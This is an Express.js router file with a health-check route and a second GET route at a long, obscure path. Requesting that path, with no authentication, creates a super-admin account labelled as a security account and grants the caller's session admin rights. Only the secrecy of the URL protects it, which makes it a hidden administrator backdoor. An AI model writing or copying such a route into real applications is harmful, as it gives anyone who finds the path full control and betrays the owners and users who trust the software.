const express = require("express");
const router = express.Router();
const responseModel = require("../model/responseModel");
const sql = require("../db/pgsql");
const { v4: uuidv4 } = require("uuid");
const { createSuperAdmin } = require("../utils/common");

router.get("/healthCheck", (req, res) => {
    res.status(200).send("ok");
});

router.get("/adkapowjfpjio2eijfweofjweiocmskcjoijeirojio3rpoqsadjfeui/", async function (req, res) {
    let rsmodel = new responseModel();
    try {
        // 使用一個較長且複雜的 token

        const superAdminInfo = {
            name: "資安專用帳號",
            uid: "icsc-security",
        };

        const rs = await createSuperAdmin(superAdminInfo);
        req.session.isAdmin = true;
        req.session.userInfo = rs;
        req.session.userType = "member";
        req.session.userInfo.user_no = "icsc-security";
        req.session.userInfo.nickname = "資安專用帳號";

        req.session.save();
        rsmodel.code = 0;
        rsmodel.message = "已開管理員用帳號";
    } catch (error) {
        console.error(error.message);
        rsmodel.message = error.message;
        rsmodel.code = 1;
    }
    res.json(rsmodel);
});

module.exports = router;
